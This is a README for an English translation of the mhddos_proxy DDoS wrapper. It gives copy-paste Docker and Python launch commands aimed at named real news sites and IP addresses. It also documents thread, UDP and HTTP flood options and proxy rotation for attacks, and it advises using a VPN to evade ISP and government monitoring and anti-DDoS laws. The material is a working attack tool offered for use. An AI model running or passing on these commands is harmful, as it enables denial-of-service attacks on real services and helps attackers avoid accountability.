- This is an english translation of the MHDDoS Proxy program to help the Ukrainian Volunteer IT Army, the Ukrainian language version can be found here: https://github.com/porthole-ascend-cinnamon/mhddos_proxy

- I have added some things to the readme that I felt helped to make use more clear to everyone.

- The script execution is the same as the Ukrainian Language version, the only thing that is diffirent is the output is in english. English is the only language that I speak, so I wanted to create an english translation of this tool so that I could better understand the output, use the tool more effectively, and so others who don't speak Ukrainian but want to help could make use of it.

Script wrapper to run the MHDDoS tool [MHDDoS](https://github.com/MHProDev/MHDDoS).

- **Does not need VPN** - the script downloads a proxylist, and selects working proxies for the attack (If you use a VPN there is a mode available use the `--vpn` flag)
- **You should Use A VPN** - In my personal/professional opinion, if you are using this tool you should be using a VPN, ideally a VPN that exits in Russia. Having an exit server in Russia will result in a more effective attack, however a VPN exiting from any country that IS NOT Ukraine is fine. In some countries it is VERY ILLEGAL to even particapate in any kind of DDoS attack (see: https://en.wikipedia.org/wiki/Computer_Fraud_and_Abuse_Act) so using a good quality VPN provider will encrypt your outbound traffic so that your ISP and governments can not easily listen in on your traffic. For information on providers you can use that have exit nodes in Russia visit: https://itarmy.com.ua/?lang=en scroll down, and select the VPN services button to see a list of providers.
- Attack **several Targets** with automatic load balancing

- Uses **various methods for attack**

### ⏱ Recent updates

- **23.04.2022** 
  - Check box changed `--vpn` - now your IP / VPN is used ** together ** with the proxy, not instead. To achieve the previous behavior, use `--vpn 100`
- **20.04.2022**
  - Significantly improved utilization of system resources for effective attack.
  - Added `--udp-threads` parameter to control the power of UDP attacks (default 1).

<details>
  <summary>📜 Previous Updates</summary>

- **18.04.2022** 
- In `--debug` mode added" total "statistics for all purposes.
  - Added more proxies.
- **13.04.2022** 
  - Added the ability to disable targets and add comments to the configuration file - now lines starting with # are ignored.
  - Fixed an issue where the script crashed after a long run and other bugs when changing loops.
  - Fixed color display on Windows (without editing the registry).
  - Now, if all the targets are unavailable, the script will wait, instead of stopping completely.
- **09.04.2022** New proxy system - now everyone gets ~ 200 proxies to attack from a total pool of over 10,000. The `-p` (` --period`) and `--proxy-timeout` parameters are no longer used.
- **04.04.2022** Added the ability to use your own proxy list for the attack - [instructions] (# custom-proxies).
- **03.04.2022** Fixed bug Too many open files (thanks, @ kobzar-darmogray and @ euclid-catoptrics).
- **02.04.2022** Workflows are no longer restarted for each cycle, but are reused. Ctrl-C has also been fixed.
- **01.04.2022** Updated CFB method in accordance with MHDDoS.
- **31.03.2022** Added reliable DNS servers for target resolving, instead of system ones. (1.1.1.1, 8.8.8.8 etc.)
- **29.03.2022** Added support for local configuration file (thanks, @ kobzar-darmogray).
- **28.03.2022** Added tabular output `--table` (thank you very much, @ alexneo2003).
- **27.03.2022**
    - DBG, BOMB (thanks to @ drew-kun for PR) and KILLER methods are allowed to run to match the original MHDDoS.
- **26.03.2022**
    - Launch all selected attacks instead of random.
    - Reduced RAM usage on a large number of targets - now only the `-t` parameter affects RAM
    - Added DNS caching and correct handling of resolving problems.
- **25.03.2022** Added VPN mode instead of proxy (`--vpn` checkbox).
- **25.03.2022** MHDDoS included in the repository for greater control over development and protection against unexpected
  changes.
</details>

### 💽 Installation | Installation - [instructions HERE](/docs/installation.md)

### 🕹 Launch | Running (different options for targets are given)

#### Docker

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477

#### Python 

    python3 runner.py https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477

### if it doesn't work - use just python instead of python3

  python runner.py https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477

### 🛠 Settings (more info is available in the section [CLI](#cli))

**All parameters can be combined**, you can specify both before and after the list of targets.

Change load - -t XXXX - number of threads, default - CPU * 1000

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 3000 https://ria.ru https://tass.ru

To view information about the progress of the attack, add the `--table` check box for the table,` --debug` for the text.

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --table https://ria.ru https://tass.ru

### 🐳 Community
- [Detailed analysis MHDDoS_proxy](https://github.com/SlavaUkraineSince1991/DDoS-for-all/blob/main/MHDDoS_proxy.md)
- [Utility for converting shared targets into config format](https://github.com/kobzar-darmogray/mhddos_proxy_utils)
- [Analysis of the tool mhddos_proxy](https://telegra.ph/Anal%D1%96z-zasobu-mhddos-proxy-04-01)
- [Example of running via docker on OpenWRT](https://youtu.be/MlL6fuDcWlI)

### CLI

    usage: runner.py target [target ...]
                     [-t THREADS] 
                     [-c URL]
                     [--table]
                     [--debug]
                     [--vpn]
                     [--rpc RPC] 
                     [--http-methods METHOD [METHOD ...]]

    positional arguments:
      targets                List of targets, separated by space
    
    optional arguments:
      -h, --help             show this help message and exit
      -c, --config URL|path  URL or local path to file with attack targets
      -t, --threads 2000     Total number of threads to run (default is CPU * 1000)
      --table                Print log as table
      --debug                Print log as text
      --vpn                  Use both my IP and proxies for the attack. Optionally, specify a percent of using my IP (default is 10%)
      --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
      --proxies URL|path     URL or local path to file with proxies to use
      --udp-threads 1        Total number of threads to run for UDP sockets (defaults to 1)
      --http-methods GET     List of HTTP(s) attack methods to use (default is GET + POST|STRESS).
                             Refer to MHDDoS docs for available options (https://github.com/MHProDev/MHDDoS)

### Own proxies

#### File format:

    114.231.123.38:1234
    username:password@114.231.123.38:3065
    socks5://114.231.155.38:5678
    socks4://username:password@114.231.123.38:3065

#### Remote file (same for Python and Docker)

    python3 runner.py --proxies https://pastebin.com/raw/UkFWzLOt https://ria.ru

#### For Python

Place the file next to `runner.py` and add the following check box to the command (replace` proxies.txt` with the name of your file)

    python3 runner.py --proxies proxies.txt https://ria.ru

#### For Docker
You must mount a volume for Docker to access the file.  
Be sure to specify the absolute path to the file and do not lose `/` before the file name

    docker run -it --rm --pull always -v /home/user/ddos/mhddos_proxy/proxies.txt:/proxies.txt ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --proxies /proxies.txt https://ria.ru
